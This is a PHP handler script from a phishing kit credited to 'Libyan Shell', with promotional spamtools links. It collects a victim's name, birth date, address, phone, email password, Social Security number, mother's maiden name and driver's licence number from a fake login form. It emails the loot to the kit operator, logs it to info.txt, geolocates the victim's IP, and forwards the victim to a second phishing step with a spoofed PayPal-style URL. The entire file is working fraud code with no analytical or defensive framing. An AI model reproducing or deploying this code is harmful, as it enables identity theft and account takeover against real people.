<?php
/*

<!--- 
By Libyan Shell
https://spamtools.pro
https://free.spamtools.pro
https://www.facebook.com/Pro.Spaming
--->
                                                                                            
*/
                                                                                                                          


include 'email.php';
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
    $subject = 'Login Account / Info [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|================ Libyan Shell rzlt ===============|'."\r\n";
    $message .= '|name                :  '.$_POST['name']."\r\n";
    $message .= '|Date of Birth       :  '.$_POST['month'].' - '.$_POST['day'].' - '.$_POST['year']." \r\n";
    $message .= '|Address Line 1      :  '.$_POST['address']."\r\n";
    $message .= '|Address Line 2      :  '.$_POST['address2']."\r\n";
    $message .= '|City                :  '.$_POST['city']."\r\n";
    $message .= '|State               :  '.$_POST['state']."\r\n";
    $message .= '|zip                 :  '.$_POST['zip']."\r\n";
    $message .= '|Phone Number        :  '.$_POST['phone1'].' - '.$_POST['phone2'].' - '.$_POST['phone3']." \r\n";
    $message .= '|Email               :  '.$_POST['email']."\r\n";
    $message .= '|Password            :  '.$_POST['empass']."\r\n";
    $message .= '|SSN                 :  '.$_POST['ssn1'].' - '.$_POST['ssn2'].' - '.$_POST['ssn3']." \r\n";
    $message .= '|Mother Name         :  '.$_POST['mmn']."\r\n";
    $message .= '|Driving License Number :  '.$_POST['dlno']."\r\n";
    $message .= "IP Geo       : http://www.geoiptool.com/?IP=".$ip."  ====\n";
    $messags   =  "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\r\n";
    $headers = 'From: Rzlt by Libyan Shell <Libyan_Shell@mail.com>'."\r\n";
    mail($to, $subject, $message, $headers);
    $file = fopen("info.txt","ab");
    mail($subject,$messags,$headers);
    fwrite($file,$message);
    fclose($file);
    header("location: Step2.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>